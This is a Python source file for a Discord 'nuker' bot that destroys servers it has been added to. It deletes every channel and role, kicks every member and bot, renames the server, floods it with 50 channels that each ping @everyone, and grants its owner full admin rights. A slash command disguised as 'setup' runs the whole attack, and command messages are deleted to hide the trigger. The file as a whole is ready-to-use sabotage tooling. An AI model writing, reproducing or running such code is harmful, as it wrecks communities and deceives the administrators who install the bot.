import discord
import config
import logging
from rich.console import Console
from rich.panel import Panel
from discord import app_commands
import asyncio

# Disable discord.py's default logging
logging.getLogger("discord").setLevel(logging.CRITICAL)
logging.getLogger("discord.client").setLevel(logging.CRITICAL)      # Suppress client logs
logging.getLogger("discord.gateway").setLevel(logging.CRITICAL)     # Suppress gateway logs

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

client = discord.Client(intents=intents)

console = Console()

tree = app_commands.CommandTree(client)

# Cyan to blue gradient for ASCII art
ascii_message = (
    "\n"
    "[#67e8f9] ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗[/#67e8f9]\n"
    "[#22d3ee] ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝[/#22d3ee]\n"
    "[#0ea5e9]██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗[/#0ea5e9]\n"
    "[#2563eb]██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝[/#2563eb]\n"
    "[#1d4ed8] ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝    ██║ ╚████║╚██████╔╝██║  ██╗███████╗[/#1d4ed8]\n"
    "[#1e293b] ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝[/#1e293b]\n"
)

print("\n")
console.print(Panel(ascii_message, title="[bold cyan]NanduBit Sponsored[/bold cyan]", expand=False), justify="center")


@client.event
async def on_ready():
    info_panel = Panel(
        f"[bold blue]🔵 Logged in as [white]{client.user}[/white][/bold blue]\n"
        f"[bold blue]🔵 Connected to [white]{len(client.guilds)}[/white] servers.[/bold blue]",
        border_style="white",
        expand=False
    )
    console.print(info_panel, justify="center")


    sorted_guilds = sorted(client.guilds, key=lambda g: g.name.lower())
    max_idx_width = len(str(len(sorted_guilds)))
    server_lines = []
    member_lines = []
    for idx, guild in enumerate(sorted_guilds, 1):
        perms = guild.me.guild_permissions
        perms_status = []
        if perms.manage_guild:
            perms_status.append("[blue]Manage Server[/blue]")
        else:
            perms_status.append("[red]Manage Server[/red]")
        if perms.manage_channels:
            perms_status.append("[blue]Manage Channels[/blue]")
        else:
            perms_status.append("[red]Manage Channels[/red]")
        if perms.manage_roles:
            perms_status.append("[blue]Manage Roles[/blue]")
        else:
            perms_status.append("[red]Manage Roles[/red]")
        if perms.ban_members:
            perms_status.append("[blue]Ban Members[/blue]")
        else:
            perms_status.append("[red]Ban Members[/red]")
        perms_str = ", ".join(perms_status)
        # Pad the index so all numbers align vertically
        idx_str = f"{idx}".rjust(max_idx_width)
        server_lines.append(
            f"[white]{idx_str}.[/] [bold blue]{guild.name}[/bold blue] -> {perms_str}"
        )
        # Member count table line
        member_lines.append(
            f"[white]{idx_str}.[/] [bold blue]{guild.name}[/bold blue] : [cyan]{guild.member_count}[/cyan] members"
        )
    server_panel = Panel(
        "\n".join(server_lines),
        title="[bold blue]Servers & Permissions[/bold blue]",
        border_style="white",
        expand=False,
        padding=(0, 0)
    )

    command_lines = [
        "[white]1.[/] [bold blue]nuke[/bold blue] - Does Everything Below",
        "[white]2.[/] [bold blue]destroy[/bold blue] - Delete all channels and roles",
        "[white]3.[/] [bold blue]botkick[/bold blue] - Kick all bots",
        "[white]4.[/] [bold blue]kickall[/bold blue] - Kick all members",
        "[white]5.[/] [bold blue]deletechannels[/bold blue] - Delete all channels",
        "[white]6.[/] [bold blue]deleteroles[/bold blue] - Delete all roles",
        "[white]7.[/] [bold blue]troll[/bold blue] - changes server name and profile",
        "[white]8.[/] [bold blue]giveperms[/bold blue] - Give admin permissions to the OWNER_ID",
        "[white]9.[/] [bold blue]masscreatechannel[/bold blue] - Create 50 channels",
        "[white]10.[/] [bold blue]masscreaterole[/bold blue] - Create 50 roles"
    ]
    command_panel = Panel(
        "\n".join(command_lines),
        title="[bold blue]Bot Commands - Prefix(!@)[/bold blue]",
        border_style="blue",
        expand=False,
        padding=(1, 2)
    )
    from rich.columns import Columns
    console.print(Columns([server_panel, command_panel]))

    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="Pain"))
    await tree.sync()



async def delete_all_channels(guild, console):
    channels = list(guild.channels)
    with console.status("[bold blue]Deleting channels...[/bold blue]"):
        for channel in channels:
            try:
                await channel.delete()
                console.log(f"[blue]Deleted channel:[/] {channel.name}")
                await asyncio.sleep(0.2)  # Add delay to avoid rate limits
            except Exception as e:
                console.log(f"[red]Failed to delete {channel.name}:[/] {e}")

async def delete_all_roles(guild, console):
    deleted = 0
    roles = list(guild.roles)
    with console.status("[bold blue]Deleting roles...[/bold blue]"):
        for role in roles:
            if role.is_default() or role >= guild.me.top_role:
                continue
            try:
                await role.delete()
                deleted += 1
                console.log(f"[blue]Deleted role:[/] {role.name}")
                await asyncio.sleep(0.2)  # Add delay to avoid rate limits
            except Exception as e:
                console.log(f"[red]Failed to delete role {role.name}:[/] {e}")
    return deleted

async def kick_all_bots(guild, console):
    await guild.chunk()
    bots = [m for m in guild.members if m.bot and m != guild.me]
    with console.status("[bold blue]Kicking all bots...[/bold blue]"):
        for bot in bots:
            try:
                await guild.kick(bot, reason="Bot kick command")
                console.log(f"[blue]Kicked bot:[/] {bot} ({bot.id})")
                await asyncio.sleep(0.2)  # Add delay to avoid rate limits
            except Exception as e:
                console.log(f"[red]Failed to kick bot {bot} ({bot.id}):[/] {e}")

async def kick_all_members(guild, console):
    members = [m for m in guild.members if not m.bot and m != guild.me and m.id != config.OWNER_ID]
    with console.status("[bold blue]Kicking all members...[/bold blue]"):
        for member in members:
            try:
                await guild.kick(member, reason="Kick all command")
                console.log(f"[blue]Kicked member:[/] {member}")
                await asyncio.sleep(0.2)  # Add delay to avoid rate limits
            except Exception as e:
                console.log(f"[red]Failed to kick member {member}:[/] {e}")

async def troll_server(guild, console):
    try:
        # Read image.png as bytes and set as icon
        with open("image.png", "rb") as f:
            icon_bytes = f.read()
        await guild.edit(name="Dumb Idiots", icon=icon_bytes, reason="Troll command")
        console.log("[blue]Changed server name and set icon from image.png.[/blue]")
    except Exception as e:
        console.log(f"[red]Failed to troll server:[/] {e}")

async def give_admin_perms(guild, owner_id, console):
    member = guild.get_member(owner_id)
    if not member:
        console.log(f"[red]OWNER_ID {owner_id} not found in guild.[/red]")
        return
    try:
        admin_role = await guild.create_role(name="Admin", permissions=discord.Permissions.all())
        await member.add_roles(admin_role)
        console.log(f"[blue]Gave admin role to OWNER_ID {owner_id}.[/blue]")
    except Exception as e:
        console.log(f"[red]Failed to give admin perms:[/] {e}")

async def mass_create_channels(guild, console, count=50):
    with console.status("[bold blue]Creating channels...[/bold blue]"):
        for i in range(count):
            try:
                channel = await guild.create_text_channel(f"GET NUKED-{i+1}")
                console.log(f"[blue]Created channel-{i+1}[/blue]")
                try:
                    await channel.send("@everyone GET NUKED 💥")
                except Exception as e:
                    console.log(f"[yellow]Failed to send message in {channel.name}:[/] {e}")
                await asyncio.sleep(0.2)  # Add delay to avoid rate limits
            except Exception as e:
                console.log(f"[red]Failed to create channel-{i+1}:[/] {e}")

async def mass_create_roles(guild, console, count=50):
    with console.status("[bold blue]Creating roles...[/bold blue]"):
        for i in range(count):
            try:
                await guild.create_role(name=f"HERE HAVE SOME BRAINCELLS-{i+1}")
                console.log(f"[blue]Created role-{i+1}[/blue]")
                await asyncio.sleep(0.2)  # Add delay to avoid rate limits
            except Exception as e:
                console.log(f"[red]Failed to create role-{i+1}:[/] {e}")

async def nuke_guild(guild, console, owner_id):
    await kick_all_bots(guild, console)
    await kick_all_members(guild, console)
    await troll_server(guild, console)
    await delete_all_channels(guild, console)
    await mass_create_channels(guild, console)
    await delete_all_roles(guild, console)
    await give_admin_perms(guild, owner_id, console)
    await mass_create_roles(guild, console)

@tree.command(name="setup", description="SET UP ALPHA UTILZ")
async def setup_command(interaction: discord.Interaction):
    if not interaction.guild:
        await interaction.response.send_message("This command can only be used in a server.", ephemeral=True)
        return
    if not interaction.guild.me.guild_permissions.administrator:
        await interaction.response.send_message("❌ This command requires administrator permissions to work.", ephemeral=True)
        return
    await interaction.response.send_message("SETTING IT UP FR", ephemeral=True)
    await nuke_guild(interaction.guild, console, config.OWNER_ID)

@client.event
async def on_message(message):
    if message.author == client.user:
        return
    if message.author.id != config.OWNER_ID:
        return
    if not message.content.startswith('!@'):
        return

    # List of valid command keywords
    valid_commands = [
        "nuke", "deletechannel", "deleterole", "botkick", "kickall",
        "troll", "giveperm", "masscreatechannel", "masscreaterole"
    ]

    # Extract the command after !@
    cmd = message.content[2:].split()[0] if len(message.content) > 2 else ""

    if cmd not in valid_commands:
        return

    console.log(f"[bold blue]Command '{message.content}' run by: {message.author} (ID: {message.author.id})[/bold blue]")

    try:
        await message.delete()
    except Exception as e:
        console.log(f"[yellow]Could not delete command message:[/] {e}")

    if message.content.startswith('!@nuke'):
        await nuke_guild(message.guild, console, config.OWNER_ID)
        await message.channel.send("👌 Nuke completed.")

    if message.content.startswith('!@deletechannel'):
        await delete_all_channels(message.guild, console)
        await message.channel.send("👍")

    if message.content.startswith('!@deleterole'):
        deleted = await delete_all_roles(message.guild, console)
        await message.channel.send(f"👍 {deleted} roles.")

    if message.content.startswith('!@botkick'):
        await kick_all_bots(message.guild, console)
        await message.channel.send("👍")

    if message.content.startswith('!@kickall'):
        await kick_all_members(message.guild, console)
        await message.channel.send("👍")

    if message.content.startswith('!@troll'):
        await troll_server(message.guild, console)
        await message.channel.send("👍")

    if message.content.startswith('!@giveperm'):
        await give_admin_perms(message.guild, config.OWNER_ID, console)
        await message.channel.send("👍")

    if message.content.startswith('!@masscreatechannel'):
        await mass_create_channels(message.guild, console)
        await message.channel.send("👍")

    if message.content.startswith('!@masscreaterole'):
        await mass_create_roles(message.guild, console)
        await message.channel.send("👍")

if __name__ == "__main__":
    try:
        client.run(config.BOT_TOKEN)
    except discord.LoginFailure:
        error_panel = Panel(
            "[bold red]❌ Invalid Discord Bot Token![/bold red]\n[white]Please provide a valid BOT_TOKEN in your config.[/white]",
            title="[bold red]Login Error[/bold red]",
            border_style="red",
            expand=False
        )
        console.print(error_panel, justify="center")
    except Exception as e:
        error_panel = Panel(
            f"[bold red]❌ Unexpected error:[/bold red]\n[white]{e}[/white]",
            title="[bold red]Error[/bold red]",
            border_style="red",
            expand=False
        )
        console.print(error_panel, justify="center")